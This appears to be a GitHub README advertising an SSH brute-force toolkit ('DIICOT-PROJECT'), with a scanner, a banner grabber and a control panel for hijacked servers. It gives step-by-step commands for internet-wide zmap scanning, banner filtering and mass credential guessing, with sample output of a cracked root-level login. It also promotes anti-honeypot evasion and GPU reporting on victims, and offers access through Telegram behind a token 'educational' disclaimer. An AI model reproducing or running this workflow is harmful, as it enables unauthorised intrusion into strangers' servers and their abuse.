# DIICOT-PROJECT

We must make the world a better place!

## Brute-SSH-FORCE:
<img width="1000" height="1000" alt="image" src="https://github.com/user-attachments/assets/54e05eb0-d479-47c6-80da-dfa89716887c" />

- Multi port - "ip:port" ipfile
- Single port - "ip" and choose port from command
- Custom timeout
- Anti-Honeypot
- Show gpus of the servers
- Very fast and accurate
- Excludes found hosts

## Banner:
<img width="1000" height="1000" alt="image" src="https://github.com/user-attachments/assets/4c7bb453-e83c-4f96-a752-174c04027959" />

- Stealth
- Fast and accurate

## Panel:
<img width="1867" height="892" alt="image" src="https://github.com/user-attachments/assets/68e4145e-afd0-4b2f-b982-1284b0c4f959" />

- U can see the results on the panel
- Download servers list 
- Check alive for dead servers
- Connect through panel on the servers

### How you should use :
```bash
# First you need to have a list of ips, if you don't have one you need to create one with zmap or masscan
zmap -p22 > test
Jul 11 12:35:59.923 [INFO] zmap: output module: csv
Jul 11 12:35:59.923 [INFO] csv: no output file selected, will use stdout
0:03 0%; send: 1640300 631 Kp/s (539 Kp/s avg); recv: 10411 4.17 Kp/s (3.42 Kp/s avg); drops: 0 p/s (0 p/s avg); hitrate: 0.63%
0:04 0%; send: 2024774 384 Kp/s (501 Kp/s avg); recv: 13228 2.81 Kp/s (3.27 Kp/s avg); drops: 0 p/s (0 p/s avg); hitrate: 0.65%

# Now wait for the whole scan to finish or you can stop it whenever you want, now you will see in the "test" list open IPs on port 22

# Now you have to use the banner to find out what version the ssh servers has and that it is not another operating system. With the banner you filter a lot of servers and it is also among the most important things
./banner 
[INFO] Syntax: ./banner [Threads] [IP File] [Multiport|Port] [Key]
./banner 5000 test 22 test
192.168.181.242 - SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.13
192.168.111.33 - SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13.12
192.168.236.91 - SSH-2.0-OpenSSH_7.4
192.168.147.95 - SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13.12
192.168.128.7 - SSH-2.0-OpenSSH_8.4p1 Debian-5
192.168.240.243 - SSH-2.0-OpenSSH_7.4
192.168.155.175 - SSH-2.0-OpenSSH_8.9p1
192.168.140.31 - SSH-2.0-OpenSSH_9.2p1 Debian-2
192.168.95.200 - SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.13
192.168.102.103 - SSH-2.0-OpenSSH_8.4p1 Debian-5+deb11u5

# And this is what you will receive in the console and in the banner.log it is just an example of ips

# Now after the banner you need to make the banner.log list in ip only format for single port
grep -a 'SSH-2.0-OpenSSH' banner.log | grep -oE '^([0-9]{1,3}\.){3}[0-9]{1,3}' | sort -u > iplist
# Now you have to use the brute
you have to put threads depending on how many cores
passfile must be in this format :
root root
user user
you choose the timeout depending on how long you want it to wait until it receives the connection because some servers receive it more slowly.
./brute
Syntax: ./brute [THREADS] [IPFILE] [PASSFILE] [TIMEOUT] [USER_KEY] [PORT_OR_MULTI]
./brute 5500 iplist pass 20 test 22
➜ Testing: root:root
   [██████████████████████████████] 100%
➜ Testing: orangepi:orangepi
   [██████████████████████████████] 100%
[✔] Valid SSH Credentials Found!
═══════════════════════════════════════════
 Host     : 192.168.1.1
 Port     : 22
 Username : orangepi
 Password : orangepi
───────────────────────────────────────────
 System   : Linux localhost.localdomain 3.10.0-1160.el7.x86_64 #1 SMP Mon Oct 19 16:18:59 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 CPU Cores: 16
 GPU      : No GPU
═══════════════════════════════════════════
This is an example of console results and how will displayed and the results will be in good.txt and in the panel too !
```

## INFO:
```
Anyone who want free acces u just need to join on telegram and PM Administrator !
More updates comming in feature !
```
[![Telegram Channel](https://t.me/diicotproject)
> This repository is intended for educational purposes and aims to help users learn and understand important concepts in [specific field]. The code and resources within this repository are provided to support the learning and experimentation process. All usage is strictly for personal study and practice. Contributions and constructive feedback are encouraged to improve this project.
